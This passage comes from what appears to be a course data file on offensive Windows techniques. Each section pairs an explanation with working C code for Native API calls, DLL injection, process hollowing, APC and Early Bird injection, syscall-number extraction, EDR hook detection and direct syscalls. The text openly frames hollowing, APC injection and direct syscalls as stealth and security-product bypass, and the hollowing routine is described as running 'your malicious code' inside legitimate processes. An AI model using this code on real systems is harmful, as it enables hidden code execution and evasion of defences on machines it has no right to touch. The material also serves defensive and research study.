                        hProc, 0, szPath, &dwSize)) {
                    wprintf(L"PID %lu: %s\\n",
                            pe.th32ProcessID,
                            szPath);
                }
                
                CloseHandle(hProc);
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
}`,
          language: "c"
        },
        {
          title: "5. Native API (NTDLL) - Undocumented Power",
          content: `The Native API (ntdll.dll) is the lowest-level Windows API layer. Win32 APIs are actually wrappers around Native API calls.

THE STACK:
Your Code → Win32 API (kernel32.dll) → Native API (ntdll.dll) → Syscall → Kernel

WHY USE NATIVE API:
• More powerful (fewer restrictions)
• Bypass user-mode hooks (EDR/AV)
• Direct access to kernel functionality
• Understanding Windows internals

RISK:
• Undocumented (can change between Windows versions)
• No compatibility guarantees
• More complex structures
• Easier to crash the system

COMMON FUNCTIONS:
• NtOpenProcess - OpenProcess equivalent
• NtReadVirtualMemory - ReadProcessMemory equivalent
• NtAllocateVirtualMemory - VirtualAlloc equivalent
• NtQuerySystemInformation - System info query
• NtCreateFile - CreateFile equivalent

RETURN VALUES:
Native API returns NTSTATUS (not BOOL). Success = 0, errors are negative.`,
          code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// NTSTATUS codes
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Native API function prototypes
typedef NTSTATUS (NTAPI* NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI* NtReadVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead
);

// EXAMPLE 1: Use NtOpenProcess
void NativeAPIExample() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    if (hNtdll == NULL) {
        wprintf(L"Cannot get ntdll.dll\\n");
        return;
    }
    
    // Get function pointers
    NtOpenProcess_t pNtOpenProcess = 
        (NtOpenProcess_t)GetProcAddress(
            hNtdll, "NtOpenProcess");
    
    NtReadVirtualMemory_t pNtReadVirtualMemory =
        (NtReadVirtualMemory_t)GetProcAddress(
            hNtdll, "NtReadVirtualMemory");
    
    if (!pNtOpenProcess || !pNtReadVirtualMemory) {
        wprintf(L"Cannot get function pointers\\n");
        return;
    }
    
    // Open process
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)1234;  // PID
    
    NTSTATUS status = pNtOpenProcess(
        &hProcess,
        PROCESS_VM_READ,
        &oa,
        &cid
    );
    
    if (NT_SUCCESS(status)) {
        wprintf(L"NtOpenProcess succeeded\\n");
        
        // Read memory
        BYTE buffer[256];
        SIZE_T bytesRead;
        
        status = pNtReadVirtualMemory(
            hProcess,
            (PVOID)0x400000,
            buffer,
            sizeof(buffer),
            &bytesRead
        );
        
        if (NT_SUCCESS(status)) {
            wprintf(L"Read %zu bytes\\n", bytesRead);
        } else {
            wprintf(L"NtReadVirtualMemory failed: %08X\\n",
                    status);
        }
        
        CloseHandle(hProcess);
    } else {
        wprintf(L"NtOpenProcess failed: %08X\\n", status);
    }
}

// EXAMPLE 2: NtQuerySystemInformation
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemProcessInformation = 5,
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

void QuerySystemInfo() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    NtQuerySystemInformation_t pNtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetProcAddress(
            hNtdll, "NtQuerySystemInformation");
    
    if (!pNtQuerySystemInformation) return;
    
    // Allocate buffer
    ULONG bufferSize = 1024 * 1024;  // 1MB
    PVOID buffer = malloc(bufferSize);
    ULONG returnLength;
    
    NTSTATUS status = pNtQuerySystemInformation(
        SystemProcessInformation,
        buffer,
        bufferSize,
        &returnLength
    );
    
    if (NT_SUCCESS(status)) {
        wprintf(L"Got system process information\\n");
        wprintf(L"Size: %lu bytes\\n", returnLength);
        
        // Parse process list (complex structure)
        // ... parsing code here ...
    }
    
    free(buffer);
}

// EXAMPLE 3: Direct structure access
void AccessPEB() {
    // Get PEB (Process Environment Block)
    // This is in TEB (Thread Environment Block)
    
#ifdef _WIN64
    PVOID peb = (PVOID)__readgsqword(0x60);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
#endif
    
    wprintf(L"PEB address: %p\\n", peb);
    
    // PEB contains lots of useful info:
    // - Loaded modules (PEB_LDR_DATA)
    // - Process parameters
    // - Heap information
    // - Image base address
}`,
          language: "c"
        }
      ]
    },
    "process-injection": {
      title: "Process Injection & Memory Manipulation",
      sections: [
        {
          title: "1. Classic DLL Injection - The Foundation",
          content: `DLL Injection is forcing a remote process to load your DLL. Once loaded, your code runs in the target's address space with full access to its memory and permissions.

HOW IT WORKS:
1. Open target process (need PROCESS_VM_WRITE | PROCESS_VM_OPERATION)
2. Allocate memory in target for DLL path string
3. Write DLL path to allocated memory
4. Create remote thread that calls LoadLibraryA/W with DLL path
5. Your DLL's DllMain executes in target process!

REQUIREMENTS:
• Target process must have same architecture (x86 DLL → x86 process)
• Must have proper permissions (usually need admin/debug privilege)
• DLL path must be accessible by target process

DETECTION:
• Creates suspicious remote thread
• LoadLibrary shows up in call stack
• Module list shows loaded DLL

USE CASES:
• Debugging/hooking  applications
• Game modding
• Malware (unfortunately)
• Security research`,
          code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD dwPid, const wchar_t* szDllPath) {
    // STEP 1: Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION |
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION,
        FALSE,
        dwPid
    );
    
    if (hProcess == NULL) {
        wprintf(L"OpenProcess failed: %lu\\n", 
                GetLastError());
        return FALSE;
    }
    
    wprintf(L"[+] Opened process PID %lu\\n", dwPid);
    
    // STEP 2: Allocate memory for DLL path
    SIZE_T pathSize = (wcslen(szDllPath) + 1) * sizeof(wchar_t);
    
    LPVOID pRemotePath = VirtualAllocEx(
        hProcess,
        NULL,
        pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pRemotePath == NULL) {
        wprintf(L"VirtualAllocEx failed: %lu\\n",
                GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    wprintf(L"[+] Allocated memory at %p\\n", pRemotePath);
    
    // STEP 3: Write DLL path to target
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(
        hProcess,
        pRemotePath,
        szDllPath,
        pathSize,
        &bytesWritten
    );
    
    if (!success || bytesWritten != pathSize) {
        wprintf(L"WriteProcessMemory failed: %lu\\n",
                GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    wprintf(L"[+] Wrote DLL path (%zu bytes)\\n", bytesWritten);
    
    // STEP 4: Get LoadLibraryW address
    // This address is the same across all processes!
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        hKernel32, "LoadLibraryW");
    
    if (pLoadLibrary == NULL) {
        wprintf(L"GetProcAddress failed\\n");
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    wprintf(L"[+] LoadLibraryW at %p\\n", pLoadLibrary);
    
    // STEP 5: Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,                          // Security
        0,                             // Stack size
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemotePath,                   // Parameter (DLL path)
        0,                             // Flags
        NULL                           // Thread ID
    );
    
    if (hThread == NULL) {
        wprintf(L"CreateRemoteThread failed: %lu\\n",
                GetLastError());
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    wprintf(L"[+] Created remote thread\\n");
    
    // Wait for DLL to load
    WaitForSingleObject(hThread, INFINITE);
    
    // Get LoadLibrary return value (HMODULE)
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    
    if (exitCode == 0) {
        wprintf(L"[-] LoadLibrary failed in target\\n");
    } else {
        wprintf(L"[+] DLL loaded at %p in target\\n",
                (LPVOID)(ULONG_PTR)exitCode);
    }
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return (exitCode != 0);
}

// Example DLL code
// Compile as DLL, inject into target
/*
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD dwReason,
                      LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Your code runs here!
        MessageBoxW(NULL,
                   L"DLL Injected!",
                   L"Success",
                   MB_OK);
        
        // Spawn your thread, install hooks, etc.
    }
    
    return TRUE;
}
*/

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: injector.exe <PID> <DLL path>\\n");
        return 1;
    }
    
    DWORD pid = atoi(argv[1]);
    
    // Convert DLL path to wide string
    wchar_t dllPath[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0,
                        argv[2], -1,
                        dllPath, MAX_PATH);
    
    if (InjectDLL(pid, dllPath)) {
        printf("[+] Injection successful!\\n");
        return 0;
    }
    
    printf("[-] Injection failed\\n");
    return 1;
}`,
          language: "c"
        },
        {
          title: "2. Process Hollowing - Running Hidden Code",
          content: `Process Hollowing creates a legitimate process in suspended state, replaces its code with your malicious code, then resumes it. From the outside, it looks like the legitimate process!

THE TECHNIQUE:
1. Create target process in suspended state (CREATE_SUSPENDED)
2. Unmap original image from memory (NtUnmapViewOfSection)
3. Allocate new memory in target at original base address
4. Write your malicious PE file to that memory
5. Update PEB to point to your image base
6. Set entry point to your code  
7. Resume main thread → your code runs!

WHY IT'S STEALTHY:
• Process looks legitimate (explorer.exe, svchost.exe, etc.)
• No suspicious DLL loads
• Original file on disk is untouched
• Bypasses application whitelisting

DETECTION:
• Memory differs from disk image
• Suspicious parent-child relationships
• Beacon activity from "legitimate" process

REQUIREMENTS:
• Must be same architecture
• Need proper Windows PE knowledge
• Target must be relocatable or you match base address`,
          code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Native API declarations
typedef NTSTATUS (NTAPI* NtUnmapViewOfSection_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS (NTAPI* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

BOOL ProcessHollowing(const wchar_t* szTargetPath,
                      const wchar_t* szPayloadPath) {
    
    // Load payload PE from disk
    HANDLE hFile = CreateFileW(szPayloadPath,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Cannot open payload\\n");
        return FALSE;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pPayload = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    
    ReadFile(hFile, pPayload, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Parse PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pPayload;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        (pPayload + pDos->e_lfanew);
    
    // STEP 1: Create target in suspended state
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    BOOL success = CreateProcessW(
        szTargetPath,    // Program
        NULL,            // Command line
        NULL, NULL,      // Security
        FALSE,           // Inherit handles
        CREATE_SUSPENDED,  // SUSPENDED!
        NULL, NULL,      // Environment, directory
        &si, &pi
    );
    
    if (!success) {
        wprintf(L"CreateProcess failed: %lu\\n",
                GetLastError());
        free(pPayload);
        return FALSE;
    }
    
    wprintf(L"[+] Created suspended process PID %lu\\n",
            pi.dwProcessId);
    
    // STEP 2: Get target PEB
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtQueryInformationProcess_t pNtQueryInformationProcess =
        (NtQueryInformationProcess_t)GetProcAddress(
            hNtdll, "NtQueryInformationProcess");
    
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    
    pNtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );
    
    // Read PEB to get image base
    PVOID pPebImageBase = (BYTE*)pbi.PebBaseAddress + 
                          sizeof(PVOID) * 2;
    PVOID targetImageBase;
    SIZE_T bytesRead2;
    
    ReadProcessMemory(pi.hProcess,
                      pPebImageBase,
                      &targetImageBase,
                      sizeof(PVOID),
                      &bytesRead2);
    
    wprintf(L"[+] Target image base: %p\\n", targetImageBase);
    
    // STEP 3: Unmap original image
    NtUnmapViewOfSection_t pNtUnmapViewOfSection =
        (NtUnmapViewOfSection_t)GetProcAddress(
            hNtdll, "NtUnmapViewOfSection");
    
    NTSTATUS status = pNtUnmapViewOfSection(
        pi.hProcess,
        targetImageBase
    );
    
    if (status != 0) {
        wprintf(L"[!] NtUnmapViewOfSection failed: %08X\\n",
                status);
    } else {
        wprintf(L"[+] Unmapped original image\\n");
    }
    
    // STEP 4: Allocate memory for our payload
    LPVOID pRemoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)pNt->OptionalHeader.ImageBase,  // Preferred base
        pNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (pRemoteImage == NULL) {
        // Try again without preferred base
        pRemoteImage = VirtualAllocEx(
            pi.hProcess, NULL,
            pNt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }
    
    if (pRemoteImage == NULL) {
        wprintf(L"VirtualAllocEx failed\\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(pPayload);
        return FALSE;
    }
    
    wprintf(L"[+] Allocated image at %p\\n", pRemoteImage);
    
    // STEP 5: Write PE headers
    SIZE_T bytesWritten;
    WriteProcessMemory(pi.hProcess,
                       pRemoteImage,
                       pPayload,
                       pNt->OptionalHeader.SizeOfHeaders,
                       &bytesWritten);
    
    // STEP 6: Write PE sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(
            pi.hProcess,
            (BYTE*)pRemoteImage + pSection[i].VirtualAddress,
            pPayload + pSection[i].PointerToRawData,
            pSection[i].SizeOfRawData,
            &bytesWritten
        );
        
        wprintf(L"[+] Wrote section: %s\\n",
                (wchar_t*)pSection[i].Name);
    }
    
    // STEP 7: Update PEB with new image base
    WriteProcessMemory(pi.hProcess,
                       pPebImageBase,
                       &pRemoteImage,
                       sizeof(PVOID),
                       &bytesWritten);
    
    // STEP 8: Set entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Set RCX/EAX to entry point
#ifdef _WIN64
    ctx.Rcx = (DWORD64)pRemoteImage + 
              pNt->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD)pRemoteImage +
              pNt->OptionalHeader.AddressOfEntryPoint;
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // STEP 9: Resume thread
    wprintf(L"[+] Resuming thread...\\n");
    ResumeThread(pi.hThread);
    
    wprintf(L"[+] Process hollowing complete!\\n");
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(pPayload);
    
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "3. APC Queue Injection - Stealthy Thread Hijacking",
          content: `APC (Asynchronous Procedure Call) injection queues your code to execute when a thread enters an alertable state. More stealthy than CreateRemoteThread!

HOW APC WORKS:
• Each thread has an APC queue
• When thread is alertable (SleepEx, WaitForSingleObjectEx), queued APCs execute
• QueueUserAPC adds function to queue
• No suspicious thread creation!

THE PROCESS:
1. Find all threads in target process
2. For each thread, queue APC with QueueUserAPC
3. Wait for thread to become alertable
4. Your code executes in thread's context

ADVANTAGES:
• No CreateRemoteThread (less suspicious)
• Reuses existing threads
• Still gets code execution

DISADVANTAGES:
• Thread must become alertable (might not happen)
• Timing dependent
• Less reliable than CreateRemoteThread

MODERN EVASION:
• Early Bird APC: Inject into suspended process before main thread runs
• More reliable, executes before any security products initialize`,
          code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Find all threads in target process
BOOL GetProcessThreads(DWORD dwPid, DWORD** ppThreadIds,
                       DWORD* pdwThreadCount) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    THREADENTRY32 te = { sizeof(te) };
    DWORD* threadIds = (DWORD*)malloc(sizeof(DWORD) * 1024);
    DWORD count = 0;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwPid) {
                threadIds[count++] = te.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    *ppThreadIds = threadIds;
    *pdwThreadCount = count;
    
    return TRUE;
}

// APC Injection
BOOL APCInjection(DWORD dwPid, const wchar_t* szDllPath) {
    // Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE,
        dwPid
    );
    
    if (hProcess == NULL) {
        wprintf(L"OpenProcess failed\\n");
        return FALSE;
    }
    
    // Allocate memory for DLL path
    SIZE_T pathSize = (wcslen(szDllPath) + 1) * sizeof(wchar_t);
    LPVOID pRemotePath = VirtualAllocEx(
        hProcess, NULL, pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pRemotePath == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write DLL path
    SIZE_T bytesWritten;
    WriteProcessMemory(hProcess, pRemotePath,
                       szDllPath, pathSize,
                       &bytesWritten);
    
    // Get LoadLibraryW address
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        hKernel32, "LoadLibraryW");
    
    // Get all threads
    DWORD* threadIds;
    DWORD threadCount;
    
    if (!GetProcessThreads(dwPid, &threadIds, &threadCount)) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    wprintf(L"[+] Found %lu threads\\n", threadCount);
    
    // Queue APC to each thread
    for (DWORD i = 0; i < threadCount; i++) {
        HANDLE hThread = OpenThread(
            THREAD_SET_CONTEXT,
            FALSE,
            threadIds[i]
        );
        
        if (hThread != NULL) {
            QueueUserAPC(
                (PAPCFUNC)pLoadLibrary,
                hThread,
                (ULONG_PTR)pRemotePath
            );
            
            wprintf(L"[+] Queued APC to thread %lu\\n",
                    threadIds[i]);
            
            CloseHandle(hThread);
        }
    }
    
    free(threadIds);
    CloseHandle(hProcess);
    
    wprintf(L"[+] APC injection complete\\n");
    wprintf(L"[*] Waiting for threads to become alertable...\\n");
    
    return TRUE;
}

// Early Bird APC (more reliable)
BOOL EarlyBirdAPC(const wchar_t* szTargetPath,
                  const wchar_t* szDllPath) {
    // Create target in suspended state
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    BOOL success = CreateProcessW(
        szTargetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,  // Suspended!
        NULL, NULL, &si, &pi
    );
    
    if (!success) {
        return FALSE;
    }
    
    wprintf(L"[+] Created suspended PID %lu\\n",
            pi.dwProcessId);
    
    // Allocate and write DLL path
    SIZE_T pathSize = (wcslen(szDllPath) + 1) * sizeof(wchar_t);
    LPVOID pRemotePath = VirtualAllocEx(
        pi.hProcess, NULL, pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    SIZE_T bytesWritten;
    WriteProcessMemory(pi.hProcess, pRemotePath,
                       szDllPath, pathSize,
                       &bytesWritten);
    
    // Get LoadLibraryW
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(
        hKernel32, "LoadLibraryW");
    
    // Queue APC to main thread (before it runs!)
    QueueUserAPC(
        (PAPCFUNC)pLoadLibrary,
        pi.hThread,
        (ULONG_PTR)pRemotePath
    );
    
    wprintf(L"[+] Queued early bird APC\\n");
    
    // Resume main thread
    // First instruction it executes will be LoadLibrary!
    ResumeThread(pi.hThread);
    
    wprintf(L"[+] Thread resumed, DLL should load\\n");
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

int main() {
    // Standard APC injection
    // APCInjection(1234, L"C:\\\\payload.dll");
    
    // Early Bird APC (more reliable)
    EarlyBirdAPC(L"C:\\\\Windows\\\\notepad.exe",
                 L"C:\\\\payload.dll");
    
    return 0;
}`,
          language: "c"
        }
      ]
    },
    syscalls: {
      title: "Direct Syscalls & Native API",
      sections: [
        {
          title: "1. Understanding System Service Numbers (SSN)",
          content: `Windows usermode functions (Win32 API) eventually call into kernel mode via system calls (syscalls). Each syscall has a unique number called the System Service Number (SSN).

THE SYSCALL FLOW:
UserApp → kernel32.dll → ntdll.dll → syscall instruction → kernel

WHAT'S AN SSN:
• Unique identifier for each kernel function
• Changes between Windows versions!
• Windows 10 vs 11, different builds = different SSNs
• Found in ntdll.dll function stubs

NTDLL STUB STRUCTURE (x64):
mov r10, rcx        ; Save first parameter
mov eax, SSN        ; Load syscall number
syscall             ; Enter kernel
ret                 ; Return to caller

WHY BYPASS NTDLL:
• EDRs hook ntdll functions
• Direct syscall bypasses hooks
• More stealthy
• Harder to detect

FINDING SSNs:
• Parse ntdll.dll at runtime
• Extract from function bytes
• Use hardcoded values (bad - version dependent!)
• Hell's Gate / Halo's Gate (dynamic resolution)`,
          code: `#include <windows.h>
#include <stdio.h>

// EXAMPLE 1: Manual SSN extraction
DWORD GetSSN(const char* szFunction) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunction);
    
    if (pFunc == NULL) {
        return 0;
    }
    
    // Check for expected pattern
    // mov r10, rcx  = 4C 8B D1
    // mov eax, SSN  = B8 XX XX XX XX
    
    if (pFunc[0] == 0x4C &&
        pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        
        // SSN is at offset +4 (4 bytes)
        DWORD ssn = *(DWORD*)(pFunc + 4);
        
        return ssn;
    }
    
    return 0;
}

void TestSSNExtraction() {
    DWORD ssn;
    
    ssn = GetSSN("NtOpenProcess");
    printf("NtOpenProcess SSN: 0x%X\\n", ssn);
    
    ssn = GetSSN("NtReadVirtualMemory");
    printf("NtReadVirtualMemory SSN: 0x%X\\n", ssn);
    
    ssn = GetSSN("NtWriteVirtualMemory");
    printf("NtWriteVirtualMemory SSN: 0x%X\\n", ssn);
    
    ssn = GetSSN("NtAllocateVirtualMemory");
    printf("NtAllocateVirtualMemory SSN: 0x%X\\n", ssn);
}

// EXAMPLE 2: Detect if function is hooked
BOOL IsHooked(const char* szFunction) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunction);
    
    if (pFunc == NULL) {
        return TRUE;  // Can't check, assume hooked
    }
    
    // Check for expected syscall stub pattern
    if (pFunc[0] == 0x4C &&
        pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        
        // Looks normal
        return FALSE;
    }
    
    // Pattern doesn't match - likely hooked!
    // Common hook patterns:
    // jmp rel32    = E9 XX XX XX XX
    // jmp [rip+X]  = FF 25 XX XX XX XX
    // mov rax, X; jmp rax = 48 B8 ... FF E0
    
    if (pFunc[0] == 0xE9) {
        printf("%s hooked (direct jmp)\\n", szFunction);
        return TRUE;
    }
    
    if (pFunc[0] == 0xFF && pFunc[1] == 0x25) {
        printf("%s hooked (indirect jmp)\\n", szFunction);
        return TRUE;
    }
    
    printf("%s has unexpected pattern!\\n", szFunction);
    return TRUE;
}

void CheckForHooks() {
    const char* funcs[] = {
        "NtOpenProcess",
        "NtReadVirtualMemory",
        "NtWriteVirtualMemory",
        "NtAllocateVirtualMemory",
        "NtCreateThread",
        "NtQueueApcThread"
    };
    
    for (int i = 0; i < sizeof(funcs)/sizeof(funcs[0]); i++) {
        if (IsHooked(funcs[i])) {
            printf("[!] %s is HOOKED\\n", funcs[i]);
        } else {
            printf("[+] %s is clean\\n", funcs[i]);
        }
    }
}

// EXAMPLE 3: Hexdump ntdll function
void HexdumpNtdllFunction(const char* szFunction) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunction);
    
    if (pFunc == NULL) {
        printf("Function not found\\n");
        return;
    }
    
    printf("\\n%s at %p:\\n", szFunction, pFunc);
    printf("=================================\\n");
    
    // Dump first 32 bytes
    for (int i = 0; i < 32; i++) {
        printf("%02X ", pFunc[i]);
        
        if ((i + 1) % 16 == 0) {
            printf("\\n");
        }
    }
    
    printf("\\n");
}

int main() {
    printf("=== SSN Extraction ===\\n");
    TestSSNExtraction();
    
    printf("\\n=== Hook Detection ===\\n");
    CheckForHooks();
    
    printf("\\n=== Function Hexdump ===\\n");
    HexdumpNtdllFunction("NtOpenProcess");
    HexdumpNtdllFunction("NtReadVirtualMemory");
    
    return 0;
}`,
          language: "c"
        },
        {
          title: "2. Direct Syscalls - Bypassing User-Mode Hooks",
          content: `Direct syscalls execute the syscall instruction directly from your code, completely bypassing ntdll.dll where EDRs hook functions.

NORMAL FLOW (Hooked):
YourCode → NtReadVirtualMemory (hooked!) → EDR → syscall → kernel

DIRECT SYSCALL:
YourCode → syscall instruction → kernel (EDR bypassed!)

IMPLEMENTATION:
1. Get SSN for function you want to call
2. Set up registers with parameters
3. Execute syscall instruction
4. Kernel does the work

ASSEMBLY REQUIRED:
You need to write x64 assembly to execute syscalls. Parameters go in:
• RCX = 1st param
• RDX = 2nd param
• R8  = 3rd param
• R9  = 4th param
• Stack = 5th+ params
• RAX = SSN
• R10 = RCX (Windows calling convention)

DETECTION:
• Syscall from non-ntdll memory (suspicious!)
• Call stack analysis shows direct syscall
• Modern EDRs detect this

SOLUTION:
Indirect syscalls (call into ntdll's syscall instead)`,
          code: `// Direct Syscall Implementation
// Requires MASM (ml64.exe) or NASM

// syscall_stub.asm
/*
.CODE

; Direct syscall stub
; RCX = SSN
; RDX = Function arguments
SyscallStub PROC
    mov r10, rcx        ; Save RCX to R10
    mov eax, ecx        ; SSN to EAX
    syscall             ; Execute syscall
    ret                 ; Return
SyscallStub ENDP

END
*/

// In C++ code:
#include <windows.h>
#include <stdio.h>

// External assembly function
extern "C" NTSTATUS SyscallStub(...);

// SSN struct
typedef struct _SYSCALL {
    DWORD ssn;
} SYSCALL;

// Get SSN for function
BOOL GetSyscall(const char* szFunc, SYSCALL* sc) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunc);
    
    if (!pFunc) return FALSE;
    
    // Extract SSN from function
    if (pFunc[0] == 0x4C && pFunc[3] == 0xB8) {
        sc->ssn = *(DWORD*)(pFunc + 4);
        return TRUE;
    }
    
    return FALSE;
}

// NtReadVirtualMemory with direct syscall
NTSTATUS DirectNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
) {
    SYSCALL sc;
    
    if (!GetSyscall("NtReadVirtualMemory", &sc)) {
        return STATUS_UNSUCCESSFUL;
    }
    
    // Call assembly stub
    return SyscallStub(
        sc.ssn,
        ProcessHandle,
        BaseAddress,
        Buffer,
        NumberOfBytesToRead,
        NumberOfBytesRead
    );
}

// Alternative: Inline assembly (x86 only, not x64!)
#ifdef _M_IX86
__declspec(naked) NTSTATUS NtReadVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
) {
    __asm {
        mov eax, SSN_HERE  ; Replace with actual SSN
        lea edx, [esp+4]   ; Parameters
        int 0x2E           ; Legacy syscall (x86)
        ret 0x14           ; Clean stack (5 params * 4 bytes)
    }
}
#endif

// x64 inline assembly alternative using NASM syntax
/*
BITS 64
DEFAULT REL

global DirectSyscall

DirectSyscall:
    mov r10, rcx            ; 1st param (Process Handle)
    mov eax, [rsp+8]        ; SSN from stack
    syscall                 ; Execute
    ret
*/

// Complete example with Hell's Gate
typedef struct _SYSCALL_ENTRY {
    DWORD ssn;
    char name[64];
} SYSCALL_ENTRY;

